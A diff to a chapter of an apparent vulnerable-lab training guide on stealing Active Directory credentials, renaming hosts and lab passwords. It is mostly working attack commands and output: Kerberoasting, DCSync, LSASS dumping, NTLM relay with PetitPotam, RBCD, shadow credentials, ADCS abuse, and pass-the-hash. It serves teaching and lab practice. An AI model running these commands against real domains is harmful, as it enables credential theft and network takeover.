@@ -50,22 +50,22 @@ The arrows above are the rest of this chapter.
 ### File-naming convention
 
 ```
-~/dvad/loot/02-cred/
+~/empire/loot/02-cred/
 ├── kerberoast/svc_jarvis.hash
 ├── kerberoast/svc_jarvis.cracked.txt
 ├── asreproast/svc_legacy.hash
 ├── dcsync/ntds.full.txt
 ├── dcsync/krbtgt.nt
-├── lsass/file01-l.dmp
-├── lsass/file01-pypykatz.txt
+├── lsass/scarif-l.dmp
+├── lsass/scarif-pypykatz.txt
 ├── dpapi/peter.parker-vault.txt
-├── relay/dc01.pfx
-├── relay/dc01.nthash
-├── shadow/sql01.pfx
-├── shadow/sql01.nthash
+├── relay/coruscant.pfx
+├── relay/coruscant.nthash
+├── shadow/kamino.pfx
+├── shadow/kamino.nthash
 ├── adcs/<ESC>/<account>.{pfx,nt}
 ├── gmsa/svc_gmsa.nt
-└── laps/file01.local-admin.txt
+└── laps/scarif.local-admin.txt
 ```
 
 Always save the **raw** captured artifact AND the **derived** key form. You'll regret not having either when re-running a chain a day later.
@@ -94,13 +94,13 @@ By design, Kerberos requires no privilege to request a TGS — you can request a
 
 ```bash
 # Via LDAP — find every kerberoastable account
-ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
-    -b 'DC=corp,DC=local' \
+ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@empire.local' -w 'EmpireLab2024!' \
+    -b 'DC=empire,DC=local' \
     '(&(samAccountType=805306368)(servicePrincipalName=*))' \
     samAccountName servicePrincipalName description memberOf
 
 # Or via impacket (shorthand)
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 ```
 
 You want the `sAMAccountName` + `servicePrincipalName` for each. Save to disk.
@@ -108,16 +108,16 @@ You want the `sAMAccountName` + `servicePrincipalName` for each. Save to disk.
 ### Roast all
 
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' \
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' \
     -dc-ip 10.10.0.10 \
     -request \
-    -outputfile ~/dvad/loot/02-cred/kerberoast/all.hash
+    -outputfile ~/empire/loot/02-cred/kerberoast/all.hash
 ```
 
 Hash format (mode 13100 = RC4, mode 19700 = AES256):
 
 ```
-$krb5tgs$23$*svc_jarvis$CORP.LOCAL$cifs/sql01.corp.local*$10b9...$f7d3...0a1b
+$krb5tgs$23$*svc_jarvis$empire.local$cifs/kamino.empire.local*$10b9...$f7d3...0a1b
 ```
 
 The `23` denotes RC4. `18` would denote AES256 (mode 19700).
@@ -142,27 +142,27 @@ You have GenericWrite on a user → add an SPN → roast → revert:
 
 ```bash
 # Add SPN
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
-         add objectAttribute victim_user servicePrincipalName 'cifs/anything.corp.local'
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
+         add objectAttribute victim_user servicePrincipalName 'cifs/anything.empire.local'
 
 # Roast
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
     -request-user victim_user -outputfile victim.hash
 
 # Remove SPN (housekeeping; not strictly required if you don't care about noise)
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
-         remove objectAttribute victim_user servicePrincipalName 'cifs/anything.corp.local'
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
+         remove objectAttribute victim_user servicePrincipalName 'cifs/anything.empire.local'
 ```
 
 ### Crack
 
 ```bash
 # RC4 — fast (modern GPU: hundreds of MH/s)
-hashcat -m 13100 ~/dvad/loot/02-cred/kerberoast/all.hash \
+hashcat -m 13100 ~/empire/loot/02-cred/kerberoast/all.hash \
         /usr/share/wordlists/rockyou.txt --status -o cracked.txt
 
 # AES256 — slower but feasible for weak passwords
-hashcat -m 19700 ~/dvad/loot/02-cred/kerberoast/all.hash \
+hashcat -m 19700 ~/empire/loot/02-cred/kerberoast/all.hash \
         /usr/share/wordlists/rockyou.txt --status
 
 # Add rules for sophistication
@@ -207,18 +207,18 @@ ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' samAccount
 
 ```bash
 # Authenticated (auto-finds all DONT_REQ_PREAUTH accounts)
-impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
-    -request -outputfile ~/dvad/loot/02-cred/asreproast/all.hash
+impacket-GetNPUsers empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
+    -request -outputfile ~/empire/loot/02-cred/asreproast/all.hash
 
 # Unauthenticated (need a username list)
-impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 \
+impacket-GetNPUsers empire.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 \
     -format hashcat -outputfile asrep.hash
 ```
 
 Hash format (mode 18200):
 
 ```
-$krb5asrep$23$peter.parker@CORP.LOCAL:c5...:fc...
+$krb5asrep$23$peter.parker@empire.local:c5...:fc...
 ```
 
 ### Crack
@@ -254,7 +254,7 @@ A non-DC principal who has these ACEs can call DRSR and ask the DC for the data 
 
 ```bash
 # Find principals with DCSync ACEs
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
          get dnsDump | jq '.[] | select(.ace_list[].right=="DS-Replication-Get-Changes-All")'
 
 # Or via BloodHound: 'Find Principals with DCSync Rights' query.
@@ -264,24 +264,24 @@ bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
 
 ```bash
 # Full dump (every account)
-impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
-    -outputfile ~/dvad/loot/02-cred/dcsync/ntds-full
+impacket-secretsdump empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 -just-dc \
+    -outputfile ~/empire/loot/02-cred/dcsync/ntds-full
 
 # Target krbtgt only (smaller, quieter)
-impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
+impacket-secretsdump empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 -just-dc \
     -just-dc-user krbtgt
 
 # Target Administrator only
-impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
+impacket-secretsdump empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 -just-dc \
     -just-dc-user Administrator
 
 # With hash (instead of password)
-impacket-secretsdump -hashes :<sync_user_NT> corp.local/doctor.strange@10.10.0.10 \
+impacket-secretsdump -hashes :<sync_user_NT> empire.local/doctor.strange@10.10.0.10 \
     -just-dc
 
 # With Kerberos ticket
 KRB5CCNAME=peter.parker.ccache impacket-secretsdump -k -no-pass \
-    corp.local/doctor.strange@dc01.corp.local -just-dc
+    empire.local/doctor.strange@coruscant.empire.local -just-dc
 ```
 
 ### Output format
@@ -311,7 +311,7 @@ Format: `name:RID:LM:NT:::`. The LM is dummy (`aad3b435...`) when `NoLMHash=1` (
 
 ```
 EventID 4662
-  ObjectName: DC=corp,DC=local
+  ObjectName: DC=empire,DC=local
   Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}   # DS-Replication-Get-Changes
               {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}   # DS-Replication-Get-Changes-All
   Accessing: doctor.strange (non-DC)
@@ -365,9 +365,9 @@ mimikatz# sekurlsa::logonpasswords
 4. **lsassy** (impacket-based, remote, no file on disk):
 
 ```bash
-nxc smb 10.10.0.13 -u peter.parker -p 'DVADlab2024!' --local-auth -M lsassy
+nxc smb 10.10.0.13 -u peter.parker -p 'EmpireLab2024!' --local-auth -M lsassy
 # Or with method selection:
-lsassy -u peter.parker -p 'DVADlab2024!' -d corp.local -M procdump 10.10.0.13
+lsassy -u peter.parker -p 'EmpireLab2024!' -d empire.local -M procdump 10.10.0.13
 ```
 
 5. **MalSecLogon / NanoDump / pypykatz live** (very stealthy):
@@ -380,8 +380,8 @@ nanodump.exe -w l.dmp --fork --duplicate
 ### Parse offline
 
 ```bash
-pypykatz lsa minidump ~/dvad/loot/02-cred/lsass/l.dmp \
-    > ~/dvad/loot/02-cred/lsass/parsed.txt
+pypykatz lsa minidump ~/empire/loot/02-cred/lsass/l.dmp \
+    > ~/empire/loot/02-cred/lsass/parsed.txt
 
 # Mimikatz-style on Windows
 mimikatz# sekurlsa::minidump l.dmp
@@ -395,25 +395,25 @@ Sample output:
 authentication_id 1234567 (12d687)
 session_id 2
 username svc_jarvis
-domainname CORP
-logon_server DC01
+domainname EMPIRE
+logon_server coruscant
 logon_time 2026-05-21T16:32:11
 sid S-1-5-21-...-1116
 secrets:
         == NT ==
                 username svc_jarvis
-                domain CORP
+                domain EMPIRE
                 lm_hash NA
                 nt_hash 8846f7eaee8fb117ad06bdd830b7586c
         == Kerberos ==
                 username svc_jarvis
-                domain CORP.LOCAL
+                domain empire.local
                 password SqlServer123!         <-- WDigest leaked
 ```
 
 ### WDigest
 
-DVAD enables `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential=1`. The defender hardening is to **set it to 0** (default since Windows 8.1 / Server 2012 R2 for KB2871997 hosts).
+EMPIRE enables `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential=1`. The defender hardening is to **set it to 0** (default since Windows 8.1 / Server 2012 R2 for KB2871997 hosts).
 
 Force it on (post-compromise persistence trick):
 
@@ -476,7 +476,7 @@ Encrypted with a key derived from the user's plaintext password. **You need eith
 
 ```bash
 # As any DA-equivalent
-impacket-dpapi backupkeys -t corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 \
+impacket-dpapi backupkeys -t empire.local/doctor.strange:'EmpireLab2024!'@10.10.0.10 \
     --export
 
 # Saves backupkey.pvk
@@ -557,37 +557,37 @@ Already detailed (chapter 09 / 06). Quick reference:
 ```bash
 # Terminal 1 — listener
 sudo ntlmrelayx.py \
-    -t ldaps://dc01.corp.local \
+    -t ldaps://coruscant.empire.local \
     --delegate-access \
     --no-da \
     -smb2support \
-    --output-file ~/dvad/loot/02-cred/relay/ntlmrelayx.txt
+    --output-file ~/empire/loot/02-cred/relay/ntlmrelayx.txt
 
-# Terminal 2 — coerce file01 to auth to us
-python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
-    attacker.corp.local 10.10.0.13
+# Terminal 2 — coerce scarif to auth to us
+python3 PetitPotam.py -d empire.local -u peter.parker -p 'EmpireLab2024!' \
+    attacker.empire.local 10.10.0.13
 ```
 
 ntlmrelayx output:
 
 ```
-[*] HTTPD: Received connection from 10.10.0.13, attacking target ldaps://dc01.corp.local
-[*] Authenticating against ldaps://dc01.corp.local as CORP\FILE01$ SUCCEED
+[*] HTTPD: Received connection from 10.10.0.13, attacking target ldaps://coruscant.empire.local
+[*] Authenticating against ldaps://coruscant.empire.local as EMPIRE\scarif$ SUCCEED
 [*] Enumerating relayed user's privileges. This may take a while on large domains
-[*] Attempting to create computer in: CN=Computers,DC=corp,DC=local
+[*] Attempting to create computer in: CN=Computers,DC=empire,DC=local
 [*] Adding new computer with username: EVIL3$ and password: <random>
 [*] Delegation rights modified successfully!
-[*] EVIL3$ can now impersonate users on FILE01$ via S4U2Proxy
+[*] EVIL3$ can now impersonate users on scarif$ via S4U2Proxy
 ```
 
-Then S4U2Self → admin shell on file01:
+Then S4U2Self → admin shell on scarif:
 
 ```bash
-impacket-getST -spn cifs/file01.corp.local -impersonate Administrator \
-    -dc-ip 10.10.0.10 'corp.local/EVIL3$:<random_pw>'
+impacket-getST -spn cifs/scarif.empire.local -impersonate Administrator \
+    -dc-ip 10.10.0.10 'empire.local/EVIL3$:<random_pw>'
 
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass file01.corp.local
+impacket-psexec -k -no-pass scarif.empire.local
 ```
 
 [Flag: CRED-031 — coerce + LDAPS relay → RBCD]
@@ -596,16 +596,16 @@ impacket-psexec -k -no-pass file01.corp.local
 
 ```bash
 sudo ntlmrelayx.py \
-    -t http://ca01.corp.local/certsrv/certfnsh.asp \
+    -t http://endor.empire.local/certsrv/certfnsh.asp \
     --adcs --template DomainController \
     -smb2support \
-    --output-file ~/dvad/loot/02-cred/relay/esc8.txt
+    --output-file ~/empire/loot/02-cred/relay/esc8.txt
 
-python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
-    attacker.corp.local 10.10.0.10
+python3 PetitPotam.py -d empire.local -u peter.parker -p 'EmpireLab2024!' \
+    attacker.empire.local 10.10.0.10
 ```
 
-You get a `.pfx` for `DC01$`. PKINIT → DCSync → done.
+You get a `.pfx` for `coruscant$`. PKINIT → DCSync → done.
 
 [Flag: CRED-032 — coerce + HTTP CA relay (ESC8)]
 
@@ -613,13 +613,13 @@ You get a `.pfx` for `DC01$`. PKINIT → DCSync → done.
 
 ```bash
 sudo ntlmrelayx.py \
-    -t smb://ws01.corp.local \
+    -t smb://tatooine.empire.local \
     -smb2support \
     -c 'powershell -enc <base64>' \
     --no-validate-privs
 
-python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
-    attacker.corp.local 10.10.0.100  # coerce ws01 → relay to ws01? No — coerce DIFFERENT host
+python3 PetitPotam.py -d empire.local -u peter.parker -p 'EmpireLab2024!' \
+    attacker.empire.local 10.10.0.100  # coerce tatooine → relay to tatooine? No — coerce DIFFERENT host
 ```
 
 Note: you cannot relay an auth back to the **same** machine that originated it (NTLM-reflection patch MS08-068). You must coerce hostA and relay to hostB.
@@ -632,14 +632,14 @@ Note: you cannot relay an auth back to the **same** machine that originated it (
 sudo ntlmrelayx.py -tf targets.txt --socks -smb2support
 # Coerce many hosts. Each landed session becomes a SOCKS proxy entry:
 [*] Servers started, waiting for connections
-[*] SOCKS: Activated relay for user CORP/FILE01$ on file01.corp.local
+[*] SOCKS: Activated relay for user EMPIRE/scarif$ on scarif.empire.local
 ```
 
 Use via proxychains:
 
 ```bash
 echo 'socks4 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
-proxychains -q impacket-smbexec -no-pass corp.local/FILE01$@file01.corp.local
+proxychains -q impacket-smbexec -no-pass empire.local/scarif$@scarif.empire.local
 ```
 
 ---
@@ -660,27 +660,27 @@ If you also have `GenericWrite` on a target computer object, you can:
 
 ```bash
 # Step 1 — make a computer
-impacket-addcomputer 'corp.local/peter.parker:DVADlab2024!' \
+impacket-addcomputer 'empire.local/peter.parker:EmpireLab2024!' \
     -dc-ip 10.10.0.10 \
     -computer-name 'EVIL$' \
     -computer-pass 'EvilPass1!'
 
 # Step 2 — write RBCD on target
-impacket-rbcd corp.local/peter.parker:'DVADlab2024!' \
+impacket-rbcd empire.local/peter.parker:'EmpireLab2024!' \
     -dc-ip 10.10.0.10 \
     -delegate-from 'EVIL$' \
-    -delegate-to 'FILE01$' \
+    -delegate-to 'scarif$' \
     -action write
 
-# Step 3 — S4U2Self for Administrator → S4U2Proxy for cifs/file01
-impacket-getST -spn cifs/file01.corp.local \
+# Step 3 — S4U2Self for Administrator → S4U2Proxy for cifs/scarif
+impacket-getST -spn cifs/scarif.empire.local \
     -impersonate Administrator \
     -dc-ip 10.10.0.10 \
-    'corp.local/EVIL$:EvilPass1!'
+    'empire.local/EVIL$:EvilPass1!'
 
 # Step 4 — use the ticket
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass file01.corp.local
+impacket-psexec -k -no-pass scarif.empire.local
 ```
 
 ### Discovery — finding GenericWrite paths
@@ -696,8 +696,8 @@ RETURN u.name, c.name, type(relationships(p)[0])
 ### Verification
 
 ```bash
-nxc smb file01.corp.local -k --use-kcache
-nxc smb file01.corp.local -u Administrator -k --use-kcache --shares
+nxc smb scarif.empire.local -k --use-kcache
+nxc smb scarif.empire.local -u Administrator -k --use-kcache --shares
 ```
 
 ### Mitigation
@@ -735,49 +735,49 @@ Introduced for Windows Hello for Business (paired with the device's TPM-resident
 
 ```bash
 certipy shadow auto \
-    -u peter.parker@corp.local -p 'DVADlab2024!' \
+    -u peter.parker@empire.local -p 'EmpireLab2024!' \
     -dc-ip 10.10.0.10 \
-    -account 'sql01$'
+    -account 'kamino$'
 ```
 
 Behind the scenes, this:
 
 1. Generates a fresh keypair.
 2. Builds a `KeyCredential` structure (KEY_USAGE = NGC, source = AzureAD-Joined Device).
-3. Writes it into `msDS-KeyCredentialLink` on `sql01$`.
-4. Performs PKINIT AS-REQ for `sql01$` with that private key.
+3. Writes it into `msDS-KeyCredentialLink` on `kamino$`.
+4. Performs PKINIT AS-REQ for `kamino$` with that private key.
 5. Receives TGT + NT hash (via UnPAC).
 6. Removes the planted credential (cleanup).
 
 Output:
 
 ```
-[*] Trying to read public key from user 'sql01$'
-[*] Trying to add a new Key Credential Link to 'sql01$'
-[*] Successfully added Key Credential Link to 'sql01$'
+[*] Trying to read public key from user 'kamino$'
+[*] Trying to add a new Key Credential Link to 'kamino$'
+[*] Successfully added Key Credential Link to 'kamino$'
 [*] Authenticating with PKINIT
 [*] Got TGT
-[*] Trying to retrieve NT hash for 'sql01$'
-[*] Got hash for 'sql01$@corp.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
-[*] Cleaning up Key Credential Link from 'sql01$'
+[*] Trying to retrieve NT hash for 'kamino$'
+[*] Got hash for 'kamino$@empire.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+[*] Cleaning up Key Credential Link from 'kamino$'
 ```
 
 ### Manual flow (when certipy refuses)
 
 ```bash
 # 1. Generate key + DeviceID
-certipy shadow add -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
-        -account 'sql01$' -out keycred.pfx
+certipy shadow add -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
+        -account 'kamino$' -out keycred.pfx
 
 # 2. PKINIT
 certipy auth -pfx keycred.pfx -dc-ip 10.10.0.10
 
 # 3. Read the planted KeyCredentialLink (sanity-check)
-certipy shadow list -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -account 'sql01$'
+certipy shadow list -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -account 'kamino$'
 
 # 4. Remove
-certipy shadow remove -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
-        -account 'sql01$' -device-id <device-guid>
+certipy shadow remove -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
+        -account 'kamino$' -device-id <device-guid>
 ```
 
 ### When the target is a user (not a computer)
@@ -805,7 +805,7 @@ Defender for Identity flags writes to `msDS-KeyCredentialLink` from non-Hello-fo
 
 ## 10.9 ADCS template abuse — CRED-022..036
 
-See chapter 06 for the full ESC catalogue. Quick reference of which DVAD CRED maps to which ESC (consult `PLAN.md` for the canonical mapping):
+See chapter 06 for the full ESC catalogue. Quick reference of which EMPIRE CRED maps to which ESC (consult `PLAN.md` for the canonical mapping):
 
 | CRED | ESC | Vector |
 |------|-----|--------|
@@ -829,14 +829,14 @@ See chapter 06 for the full ESC catalogue. Quick reference of which DVAD CRED ma
 
 ```bash
 # Find vulnerable template
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -vulnerable
 
 # Enroll with SAN spoof
 certipy req \
-    -u peter.parker@corp.local -p 'DVADlab2024!' \
-    -ca CORP-CA -target ca01.corp.local \
+    -u peter.parker@empire.local -p 'EmpireLab2024!' \
+    -ca EMPIRE-CA -target endor.empire.local \
     -template VulnerableESC1 \
-    -upn 'administrator@corp.local'
+    -upn 'administrator@empire.local'
 
 # Auth with the cert
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
@@ -847,22 +847,22 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 
 ```bash
 # Create computer
-impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
+impacket-addcomputer empire.local/peter.parker:'EmpireLab2024!' \
     -computer-name 'EVIL$' -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
 
-# Set its dNSHostName to dc01.corp.local
-bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
-    set objectAttribute 'EVIL$' dNSHostName dc01.corp.local
+# Set its dNSHostName to coruscant.empire.local
+bloodyAD -d empire.local -u peter.parker -p 'EmpireLab2024!' --host 10.10.0.10 \
+    set objectAttribute 'EVIL$' dNSHostName coruscant.empire.local
 
-# Enroll Machine template — cert will be issued to DC01's identity
-certipy req -u 'EVIL$@corp.local' -p 'EvilPass1!' -ca CORP-CA \
+# Enroll Machine template — cert will be issued to coruscant's identity
+certipy req -u 'EVIL$@empire.local' -p 'EvilPass1!' -ca EMPIRE-CA \
     -template Machine -dc-ip 10.10.0.10
 
 # PKINIT → DC TGT
 certipy auth -pfx evil.pfx -dc-ip 10.10.0.10
 ```
 
-Patch: KB5014754 (May 2022). Adds `szOID_NTDS_CA_SECURITY_EXT` to bind cert to SID. DVAD leaves the patch off.
+Patch: KB5014754 (May 2022). Adds `szOID_NTDS_CA_SECURITY_EXT` to bind cert to SID. EMPIRE leaves the patch off.
 
 ---
 
@@ -871,7 +871,7 @@ Patch: KB5014754 (May 2022). Adds `szOID_NTDS_CA_SECURITY_EXT` to bind cert to S
 ### xp_cmdshell as SYSTEM (or service account)
 
 ```bash
-impacket-mssqlclient corp.local/peter.parker:'DVADlab2024!'@10.10.0.14 -windows-auth
+impacket-mssqlclient empire.local/peter.parker:'EmpireLab2024!'@10.10.0.14 -windows-auth
 
 1> SELECT IS_SRVROLEMEMBER('sysadmin')
 1> EXEC sp_configure 'show advanced options', 1; RECONFIGURE
@@ -903,7 +903,7 @@ If you can `IMPERSONATE LOGIN sa`, you become sysadmin. PowerUpSQL automates the
 ```powershell
 Invoke-SQLAuditDefaultLoginPw -Verbose
 Invoke-SQLAuditPrivImpersonateLogin -Verbose
-Get-SQLServerLinkCrawl -Instance sql01 -Verbose
+Get-SQLServerLinkCrawl -Instance kamino -Verbose
 ```
 
 ### TRUSTWORTHY chain
@@ -952,13 +952,13 @@ $LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
 The `msDS-GroupMSAMembership` is a SDDL-encoded SD. To read it:
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gmsa
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M gmsa
 ```
 
 If your account is in the readers list:
 
 ```bash
-gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
+gMSADumper.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -l 10.10.0.10
 ```
 
 Output:
@@ -971,8 +971,8 @@ svc_gmsa$ KRB AES256: a1b2c3...
 Use immediately:
 
 ```bash
-impacket-getTGT -hashes :8846f7... 'corp.local/svc_gmsa$'
-impacket-psexec -k -no-pass 'corp.local/svc_gmsa$@target'
+impacket-getTGT -hashes :8846f7... 'empire.local/svc_gmsa$'
+impacket-psexec -k -no-pass 'empire.local/svc_gmsa$@target'
 ```
 
 [Flag: CRED-024 — gMSA read]
@@ -989,7 +989,7 @@ impacket-psexec -k -no-pass 'corp.local/svc_gmsa$@target'
 ### Legacy LAPS
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --dump-laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --dump-laps
 # Or via ldapsearch
 $LDAP "(ms-Mcs-AdmPwd=*)" sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
 ```
@@ -999,7 +999,7 @@ $LDAP "(ms-Mcs-AdmPwd=*)" sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTi
 Attribute changed to `msLAPS-Password` (cleartext when no encryption configured) and `msLAPS-EncryptedPassword` (DPAPI-NG encrypted when enabled).
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' -M laps
 ```
 
 NetExec's `laps` module handles legacy + Windows LAPS encryption decoding automatically.
@@ -1015,9 +1015,9 @@ Once you have credentials in **any** form, the same principle holds: forge or re
 ### PTH (NT hash)
 
 ```bash
-impacket-psexec -hashes :<NT> 'corp.local/Administrator@dc01.corp.local'
-impacket-wmiexec -hashes :<NT> 'corp.local/Administrator@dc01.corp.local'
-impacket-smbclient -hashes :<NT> 'corp.local/Administrator@dc01.corp.local'
+impacket-psexec -hashes :<NT> 'empire.local/Administrator@coruscant.empire.local'
+impacket-wmiexec -hashes :<NT> 'empire.local/Administrator@coruscant.empire.local'
+impacket-smbclient -hashes :<NT> 'empire.local/Administrator@coruscant.empire.local'
 evil-winrm -i 10.10.0.10 -u Administrator -H <NT>
 nxc smb 10.10.0.0/21 -u Administrator -H <NT> --local-auth
 ```
@@ -1026,11 +1026,11 @@ nxc smb 10.10.0.0/21 -u Administrator -H <NT> --local-auth
 
 ```bash
 # Get TGT from AES key
-impacket-getTGT -aesKey <AES256> 'corp.local/Administrator'
+impacket-getTGT -aesKey <AES256> 'empire.local/Administrator'
 
 # Use the TGT
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass 'corp.local/Administrator@dc01.corp.local'
+impacket-psexec -k -no-pass 'empire.local/Administrator@coruscant.empire.local'
 ```
 
 ### PTT (Kerberos ticket)
@@ -1051,7 +1051,7 @@ On Windows (Rubeus):
 ```
 PS> Rubeus.exe ptt /ticket:peter.parker.kirbi
 PS> klist
-PS> dir \\dc01.corp.local\C$
+PS> dir \\coruscant.empire.local\C$
 ```
 
 ### PTC (pass-the-cert)
@@ -1061,7 +1061,7 @@ PS> dir \\dc01.corp.local\C$
 certipy auth -pfx peter.parker.pfx -dc-ip 10.10.0.10
 
 # Or generate a TGT and PTT
-KRB5CCNAME=peter.parker.ccache impacket-psexec -k -no-pass 'corp.local/peter.parker@target'
+KRB5CCNAME=peter.parker.ccache impacket-psexec -k -no-pass 'empire.local/peter.parker@target'
 ```
 
 ### Overpass-the-hash (the hybrid)
@@ -1069,7 +1069,7 @@ KRB5CCNAME=peter.parker.ccache impacket-psexec -k -no-pass 'corp.local/peter.par
 You have an NT hash but want a Kerberos TGT (so you can use kerberos-only services, or move where NTLM is disabled):
 
 ```bash
-impacket-getTGT -hashes :<NT> 'corp.local/Administrator'
+impacket-getTGT -hashes :<NT> 'empire.local/Administrator'
 ```
 
 This calls AS-REQ with `PA-ENC-TIMESTAMP` derived from the NT hash (RC4 etype). Works because RC4 Kerberos key derivation = NT hash directly. If RC4 is disabled on the account, you need the AES key instead (PTK).
@@ -1157,7 +1157,7 @@ Slower than NT (PBKDF2-HMAC-SHA1 with 10,240 iterations); use rules, not pure br
 
 ## 10.16 Kerberos delegation abuse — re-cap from chapter 05
 
-DVAD ships three delegation flavours:
+EMPIRE ships three delegation flavours:
 
 ### Unconstrained — CRED-017
 
@@ -1177,8 +1177,8 @@ mimikatz# sekurlsa::tickets /export
 `msDS-AllowedToDelegateTo` populated → S4U2Self + S4U2Proxy for the listed SPNs only.
 
 ```bash
-impacket-getST -spn 'cifs/file01.corp.local' -impersonate Administrator \
-    -dc-ip 10.10.0.10 'corp.local/svc_constrained:Password1!'
+impacket-getST -spn 'cifs/scarif.empire.local' -impersonate Administrator \
+    -dc-ip 10.10.0.10 'empire.local/svc_constrained:SithLord1!!'
 ```
 
 ### RBCD — CRED-019
@@ -1254,10 +1254,10 @@ Step | Action                                              | What changes
 -----+-----------------------------------------------------+--------------
   1  | Responder LLMNR poison → tony.stark NetNTLMv2              | tony.stark's plaintext (after crack)
   2  | Kerberoast svc_jarvis → hashcat 13100                  | svc_jarvis plaintext
-  3  | impacket-mssqlclient ... -windows-auth + xp_cmdshell| SYSTEM on sql01
-  4  | comsvcs MiniDump lsass → pypykatz                   | NT hashes for everyone on sql01
-  5  |   - svc_backup (Backup Operators) NT hash captured  | path to DC
-  6  | evil-winrm with svc_backup NT → file01              | local admin on file01? or DC?
+  3  | impacket-mssqlclient ... -windows-auth + xp_cmdshell| SYSTEM on kamino
+  4  | comsvcs MiniDump lsass → pypykatz                   | NT hashes for everyone on kamino
+  5  |   - svc_r2d2 (Backup Operators) NT hash captured  | path to DC
+  6  | evil-winrm with svc_r2d2 NT → scarif              | local admin on scarif? or DC?
   7  | If DC: reg save SAM SYSTEM, robocopy /b NTDS.dit    | local-disk NTDS
   8  | impacket-secretsdump LOCAL → krbtgt hash            | krbtgt
   9  | Golden TGT (chapter 12)                             | forge any TGT, any user
@@ -1272,13 +1272,13 @@ Every step replaces one credential form with another. Recon then exploit then re
 ### Exercise 10.A — Roast everything
 
 ```bash
-impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
-    -request -outputfile ~/dvad/loot/02-cred/asreproast/all.hash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
-    -request -outputfile ~/dvad/loot/02-cred/kerberoast/all.hash
